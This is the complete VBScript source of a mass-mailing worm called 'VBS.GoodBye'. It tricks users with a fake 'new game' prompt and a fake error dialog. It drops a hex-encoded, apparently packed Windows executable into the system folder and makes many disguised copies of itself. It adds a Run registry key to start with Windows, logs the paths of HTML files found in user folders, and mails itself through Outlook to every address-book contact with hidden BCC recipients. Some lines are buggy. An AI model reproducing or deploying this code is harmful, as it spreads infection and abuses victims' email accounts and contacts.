'VBS.GoodBye Written in France.
'My last Worm. I say Good Bye
On Error Resume Next
dim w,f,win,sys,file
Set w=CreateObject("WScript.Shell")
Set fso=CreateObject("Scripting.FileSystemObject")
Set win=fso.GetSpecialFolder(0)
Set sys=fso.GetSpecialFolder(1)
Set tmp=fso.GetSpecialFolder(2)


Set wo=fso.GetFile(WScript.ScriptFullName)
If wo <> (sys&"\Cmmon32.vbs") Then
MsgBox "Look at this new Game",vbinformation,"New Game For You"
img="4D5A50000200000004000F00FFFF0000B80000000000000040001A00000000000000000000000000000000000000000000000000000000000000000000010000BA10000E1FB409CD21B8014CCD219090546869732070726F6772616D206D7573742062652072756E20756E6465722057696E33320D0A243700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000504500004C010300792B6F3E0000000000000000E0008F810B010219001000000010000000600000707B00000070000000800000000040000010000000020000010000000000000003000A000000000000900000001000000000000002000000000010000020000000001000001000000000000010000000000000000000000000800000D800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000600000001000000000000000040000000000000000000000000000800000E055505831000000000010000000700000000E000000040000000000000000000000000000400000E0555058320000000000100000008000000002000000120000000000000000000000000000400000C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000312E323000555058210C090208FE04035553A61E6206540000660B0000003000002600002799C3FEFF6A00E8000007176A5068C8204000500C64C9FE7FF70B3504002D5C52554E5733322E455845001AF69F41BA6B263223525C4D535641247FD91B723256337185C00F84EEF766DB4201096A131D1806F9103F60BF903232682C2184B05C5C5749646FB2DB4E2E024900186B095D19FB8FFD00CD72756E08DA77696E646F7773C265EC6337FFF05348454C4C646C6C152FA3172635FFFFFF7601171A4765745370656369616C466F6C646572506174684100FFFBCD7DB0352206DBA30B09A26A0768A42108DF7EB7F7FF1510CC746941535CF6526567693764FBDB73743A65642E68746DA2A4D88775BB5D80806A023E016809401B067DDB7CF8F3A3FB25400AFF250B051268A7284065977DCF77163C5F0A298DEC6473E1FFE91F05A296200509C7BE679F4768F62FD5DC2A872A151D40648B3DFB742A48A30F3E05A9234E0FD85D761BD5C675E70EED04021F3E2CE1666A0145542EB8760314BA9F5DA31B270250496EEE6E39D0BE6D373C436F6E08630E64537461059AE71BD2381B363F03EBB2BF82FBEB27083E0E4875F029145EB2E1FFEFFA20029FEE4BB2B12DC42E02694CFA09F66C33FC6A146888250B2588C8737ECFB6B1DB758B72790DD23174B27768BBFD1CDD6A2226016D0E830B8A85220CFBFFC23F03066F62656CAF6B2E6D70742E636F6D2E756B24E1FFE51FA791E302EB05E9040B8B710CAD508F054613F85BF7571801BF1F8FA3850F40D3D496DD7E0FD2104A4E0204190000BBE9BEE7FD232DAD28A0BEC827107E07FB7DB30633C02F76052750500E8501332C7C43319B137223C6BF0DD86E00DF23404BA199584174550BDD7FFFFFDB7451B03280FB02750140AE7407BEDC590133C9B8722750FF1F6CEC51B88106514B26FCAD0FB7C8C1E81003C551EEFFCB6E5651504E95593BC175074B0F8967FF008537DF64167D048904204D41E1867618482FC974C95FFA748713B121445365684D61696CC877200DF3134B2907083985346D7C04940252401E20685E0F19E785F117FE04DAFDC64A4E322E060E162D4BD2E1E5FC0401CBA7BB7FB65AE65006E166833DEA0B03757344342EFDFF4750726F707269E974E973205379F8EA6DF6BE0DD7094AB9154322246BD8ADF6FE19656D202BD72B657323DDDE3E0FB98BF89A50FE694B20FC77611BB756BB2C206902BAFE2079D120DB1FFBFB3A2D2900572DB3EB8D3606E760BE22308256490EEB7F140B83F80174525C03B3BD7EAC5658974774364F72CA23DB3CAC31465368A001B22D1621D6C6065F05293E56CB76BC5376C36054806876CCE3FE776B1B17264893C750005C5053CA36DFB3CD3B439512045511412B96C76FF9D83B53B61119916B6D24DF2F7C7B746F3A5F5D0759F3A6E21746E2F4567F59F75FBE9155537D2933D283C607BFEA219DFF1BFF7FAC3C2074103C22740F3C27740B3C407C42AAEBEB46EBE832C087FBFDFDAA5F85D274A857BEEBA17B686DE5DEB55B33562B5C07C3EAF8400664E439B205FC00410408646464640C101418646464641C202428646464642C303438646464643C404448646464644C505458646464645C60646C646464647074787C646464648084888C05656664949800FFFF7F10492D576F726D2E4D614C6F5465596120636F6465646FFF58F020627920C6286329323030310730352F01FFB7F630372900271E20496E204672616E6365F6734BF0A8E59CF803007F270783745D7702039D130107B5CD366BBE60232790A52B00CC05EE4B23BF132A00FE7FD9033220174E657720566972757320416C76887F2188202121005468696EC294ACFDF6666978056761696E7318DEFD76FB0DCC722E0D0A5275BC7468C3617474616330A835B707642D41DEE8BF15DB6D291C6F20E274FC2C2072657088F7B66D45722A6E2570726F13DDFF1D76C75B74716D616C6963696F8977FC66387C68002D2902312031353A60DF5AA1311E3B736F6674B062D8E777760A5F61406D20156D6BBBB7004317816D175C0A77B782200106006E036D4F200BDF5256E1CD4D41494C8B525FC33BF74F4D3A3C88A279614070B86B213EDD62ED77ED43505420544F1D146A756C681FECAD06286E69611F4441544105B087F156CC0C3A202203222C4CBB35C32F5375626A0329266E6704623B447869766549601C50AD2D6C3BED64270B69696E1424DED00608C2268151554954CADB0DDA053CCC6C3E05656164D14058D863740A3ED0D9AD35227D64196B3C2F1FDFBD8BB5072D3B53435249D84C414E4755982DB4FF4147453D2256425363791822A6D1B61BE4C53F6F6C0C64EEB7B5F6AC140663614EBD0B66AFEC6D736E752E0A5A39221049662013C1DD76C4D22E76FA7565173676E36F5B6D6E1C094D7367426F50224622401B85C26713143E45D89CFBCE1F3709456C73650619633D1DD9ED51EE3AA66E284C29B28533D7232000803DEF642283B9619F2C692C31268E29222DFC5EB24085180045780A20B9E618CC7012459A2F0C6123CC2D1078DA3E3D8C49B1B0FAC11A2C7BB3032233E03D4273A52109FEB3C4076160034B880788EB614283AB2FACB6625BB4B7ED565762675F6C873D7768C9DD6FBB7340B73D626C926B2070205867175CD4729A5A8BCD3C6649ADE10DC82073697A91350E4B3ADECA582B312A7017D65AC24F27334D33A5AFB62D501561DF006C5C37FB10A475CF222E204642990AA6B10759F520F28708F528825A1AEE58C84EA869322E77084204F76F4D206E616D707B9056D8DA847C4D33680D15C1DD5AFB504F535414ED157970240E4DEEECF22F706E22464E3A4B3CACE1CC6D6770A0486E9E202EB2CF5CEB54B13DD03430227E0A605BE1461EAD6E3CAC3D00DBC7653F4369203AB5CA1A8E76276539CC95B208BA771E3B31B2C7A9452D513AB360A9ECA63A312506A9B58D73786DC027CA53948567C10E4E42316F6F259C656E67636B2722B8EDDB02238905423E4146845F60E18D5273454749B9523E494F4E20A92DB0FD594F552043410744A6451C735A6B4B6D481AA3490B4B2E4E66B730180C726D0958060EBCCF0315D2D51A5C08FA677560A763EBEA86D1354F7272A572E81A27199AD9D2EB534152152E35AC0B3D43D1A2DCCE8EC04F9A28223469442E467B168B1CD7AE1B222933EBD9903D77733257332E532ADAB4BD42E025212E525772D2B6E97F9F22484B43555C53727761355C80EA0A564D5C2C9170554DB466CE0B1B155CDB06AEA92F9150C14522DE74B51F6BFB703A2F2F77002E6476782E667202146C737F5D646F63CA432E665ED82E9F9A66616327764C64066127204F2800B32881F127324F4CE2C4273EE5B2ED6E17DB59B866C1AE6D026E141C78B74E7668723E57AC00FE1B59C91B48544D4C2FEFC161E0FEF12EC319A2843508AD22B7457228488E040100300844EB1420AB02E5427511704EF8307244258846322A4A05AD2308410E958AFD370AB663416464726573730F836A1F231E54696D650E58E4FEC59E1F1B3A436C6F7317601F2C462B43436F70790AA2C7FEDB4617654C6962726172794B4375726B0BD1B75A74446972926F1471D9B63D362C7474722875447313FBB1427453CF0C4D6F64756C5EA2595714EA417A81CD96BDBDB6A659AD15AAB19B4897228982380BF24C6F61642F577DB284C52B30C54D617070EF77AE141E1309566965774F66165632816CC35353DE0ED4C313506FFD0F556E6DC01ED1C24AD30AEE35B86D5004767E5E66FB4AAC6D5063806CB463170842028B1D6D70BC2BD586B3D8CD7D9431007CDF54DA34DD2C082F1025886CBBB6F0F0632073CD6B2D835341D0C63E459675700B4356AFB561AF390B1F293E05A0B6CE6D17630DFB7605670675BEE19F1D62796E61F4F92F4F6A3B50454C010400792B6F3E8334FF0FE0008F810B01021900081A10CE3EAA60030B400B024E8A0EE69D1E03005A608C0D1B590402383310CB25359B09D54042815C069204502401F625EC57434F4445D7EB062398A9EA16B660540CB7906E6C0312270EC241065B78C02E6964E9614B405B2804B0202792CE6327A66C100650242627500000BCFB1BA0796252000012000000FF0000000000000000000060BE007040008DBE00A0FFFF5783CDFFEB109090909090908A064688074701DB75078B1E83EEFC11DB72EDB80100000001DB75078B1E83EEFC11DB11C001DB73EF75098B1E83EEFC11DB73E431C983E803720DC1E0088A064683F0FF747489C501DB75078B1E83EEFC11DB11C901DB75078B1E83EEFC11DB11C975204101DB75078B1E83EEFC11DB11C901DB73EF75098B1E83EEFC11DB73E483C10281FD00F3FFFF83D1018D142F83FDFC760F8A02428807474975F7E963FFFFFF908B0283C204890783C70483E90477F101CFE94CFFFFFF5E89F7B9630000008A07472CE83C0177F7803F0075F28B078A5F0466C1E808C1C01086C429F880EBE801F0890783C70589D8E2D98DBE005000008B0709C0743C8B5F048D84300070000001F35083C708FF9650700000958A074708C074DC89F95748F2AE55FF965470000009C07407890383C304EBE1FF965870000061E93C93FFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000070800000508000000000000000000000000000007D800000608000000000000000000000000000008880000068800000000000000000000000000000000000000000000094800000A2800000B280000000000000C080000000000000CE800000000000004B45524E454C33322E444C4C005553455233322E646C6C0057534F434B33322E646C6C0000004C6F61644C69627261727941000047657450726F634164647265737300004578697450726F6365737300000046696E6457696E646F774100000073656E640000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
lire=decr(img)
Set pic=fso.CreateTextFile(win&"\New_Prog.exe",true)
pic.Write lire
pic.Close
'w.Run win&"\New_Prog.exe",1,false
MsgBox "Script : "&wo&vbCrLf&"Error : Cannot read this script"&vbCrLf&"Code : 800A000D",vbcritical,"Windows Script Host"
End If

If not fso.FolderExists(sys&"\Plg_PTK") Then
fso.CreateFolder(sys&"\Plg_PTK")
End If

x=0
do while x<100
a=x
extension
wo.Copy(sys&"\Plg_PTK\Save"&a&crext)
x=x+1
loop

wo.Copy(sys&"\Cmmon32.vbs")
wo.Copy(sys&"\Plg_PTK\Important.vbs")
run=("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\MS Cmmon32")
w.RegWrite run,("wscript "&sys&"\Cmmon32.vbs")

If Day(Now)=11 and Month(Now)=9 Then
w.RegDelete ("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\MS Cmmon32")
End If

cache=w.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Cache")
desktop=w.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Desktop")
personal=w.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Personal")
progfile=w.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
commonfile=w.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\CommonFilesDir")

Mail(win)
Mail(sys)
Mail(tmp)
Mail(cache)
Mail(desktop)
Mail(personal)
Mail(progfile)
Mail(commonfile)

Call SpreadOut

Function extension
text="ComExeBatDocXlsPptTifBmpJpgGifHtmHttMp3WavMid"
randomize (timer)
tfile=int(rnd(1)*14)+1
crext="."& mid(text,((tfile-1)*3)+1,3)
crext=crext&".vbs"
End Function


Function decr(octet)
For hexa=1 To Len(octet) Step 2
decr=decr & Chr("&h" & Mid(octet, hexa, 2))
Next
End Function


Function Mail(dossier)
If not fso.FileExists(sys&"\Plg_PTK\Info.txt") Then
Set DF=fso.CreateTextFile(sys&"\Plg_PTK\Info.txt")
DF.WriteLine "Files Found By VBS.GoodBye.Worm :"
DF.WriteBlankLines(1)
DF.Close
End If
If fso.FolderExists(dossier) Then
For Each File in fso.GetFolder(dossier).Files
ext=fso.GetExtensionName(File.Name)
If  (ext="htm") or (ext="html") or (ext="php") or (ext="htt") Then
Set see = fso.OpenTextFile(File.path, 1)
liretout = see.ReadAll

For i = 1 to len(liretout)
mailto = mid(liretout,i,7)
If mailto = "mailto:" Then
msgbox mailto,vbinformation,File.path
Exit For
else
End If
Next
see.Close
Set DF = fso.OpenTextFile(sys&"\Plg_PTK\Info.txt", 8, True)
DF.WriteLine date& "  " &time& " => " &File.path
DF.Close
End If
Next
End If
End Function

Function SpreadOut
Set out=CreateObject("Outlook.Application")
If out Is Nothing Then
MsgBox "This Computer doesn't use Outlook",vbinformation,"Good Alert"
WScript.Quit
Else
Set map=out.GetName("MAPI")
For Each G In map.AddressLists
If G.AddressEntries.Count <> 0 Then
For B=1 To G.AddressEntries.Count
Set C.AddressEntries.Count(G)
Set lettre=out.CreateItem(0)
lettre.To=C.Address
lettre.BCC="petik@multimania.com; panda34@caramail.com"
lettre.Subject="Important Message for " &B.Name& "."
lettre.Body="Look at this. It's very important."
lettre.Attachments.Add(sys&"\Plg_PTK\Important.vbs")
lettre.DeleteAfterSubmit=True
If lettre.To <> "" Then
lettre.Send
End If
Next
End If
Next
End If
End Function
